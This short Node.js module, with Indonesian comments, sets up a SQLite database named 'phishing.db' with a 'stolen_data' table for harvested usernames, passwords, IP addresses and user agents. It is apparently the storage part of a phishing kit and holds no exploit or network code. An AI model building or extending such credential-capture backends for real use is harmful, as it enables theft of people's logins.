import sqlite3 from 'sqlite3';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const DATA_DIR = path.join(__dirname, '../../data');
const DB_PATH = path.join(DATA_DIR, 'phishing.db');

// Buat folder data jika belum ada
if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
}

// Koneksi database
const db = new sqlite3.Database(DB_PATH);

// Buat tabel jika belum ada
db.run(`
    CREATE TABLE IF NOT EXISTS stolen_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        username TEXT,
        password TEXT,
        ip TEXT,
        user_agent TEXT
    )
`);

console.log('Database connected:', DB_PATH);

export { db, DB_PATH };